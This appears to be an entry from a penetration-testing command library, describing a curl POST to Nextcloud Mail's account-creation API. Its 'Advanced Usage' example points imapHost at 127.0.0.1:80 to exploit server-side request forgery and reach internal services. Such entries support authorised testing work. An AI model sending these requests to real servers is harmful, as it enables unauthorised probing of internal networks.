---
id: cmd-1
data: >-
  curl -X POST https://nextcloud.example.com/apps/mail/api/accounts -H
  "Content-Type: application/json" -H "Cookie: your_session_cookie" -d
  '{"imapHost":"myimapserver.org","imapPort":993,"imapSslMode":"tls","imapUser":"user@example.com","imapPassword":"pass","smtpHost":"mysmtpserver.org","smtpPort":465,"smtpSslMode":"tls","smtpUser":"user@example.com","smtpPassword":"pass","accountName":"user@example.com","emailAddress":"user@example.com"}'
tags:
  - ssrf
  - http-post
type: command
output: null
executor: curl
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T04:39:09.956Z'
verified: false
validated: true
submitted: true
---
# post-mail-account-creation-request

## Command

```bash
curl -X POST https://nextcloud.example.com/apps/mail/api/accounts \
  -H "Content-Type: application/json" \
  -H "Cookie: your_session_cookie" \
  -d '{"imapHost":"myimapserver.org","imapPort":993,"imapSslMode":"tls","imapUser":"user@example.com","imapPassword":"pass","smtpHost":"mysmtpserver.org","smtpPort":465,"smtpSslMode":"tls","smtpUser":"user@example.com","smtpPassword":"pass","accountName":"user@example.com","emailAddress":"user@example.com"}'
```

## Description

Sends a POST request to create a mail account in Nextcloud Mail app, triggering an IMAP connection attempt to the specified host and port. Used in SSRF exploitation by modifying parameters.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | HTTP method | Yes |
| `-H "Content-Type: application/json"` | Sets JSON content type | Yes |
| `-H "Cookie: your_session_cookie"` | Authentication cookie | Yes |
| `-d '{JSON}'` | Payload with imapHost, imapPort, etc. | Yes |
| `imapHost` | IMAP server hostname | Yes |
| `imapPort` | IMAP port (e.g., 993) | Yes |
| `imapSslMode` | SSL mode (tls, none) | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://nextcloud.example.com/apps/mail/api/accounts -H "Content-Type: application/json" -H "Cookie: session=abc" -d '{"imapHost":"imap.gmail.com","imapPort":993,"imapSslMode":"tls",...}'
```

### Advanced Usage

```bash
# For SSRF test
curl -X POST https://nextcloud.example.com/apps/mail/api/accounts -H "Content-Type: application/json" -H "Cookie: session=abc" -d '{"imapHost":"127.0.0.1","imapPort":80,"imapSslMode":"none",...}'
```

## Expected Output

JSON response from server, e.g., {"ocs":{"meta":{"status":"ok"},"data":{...}}}; triggers backend connection, observable via timing or external tools.

## Related

- [[commands/modified-port-scan-payload]]
- [[procedures/Confirm-SSRF-with-External-Server]]
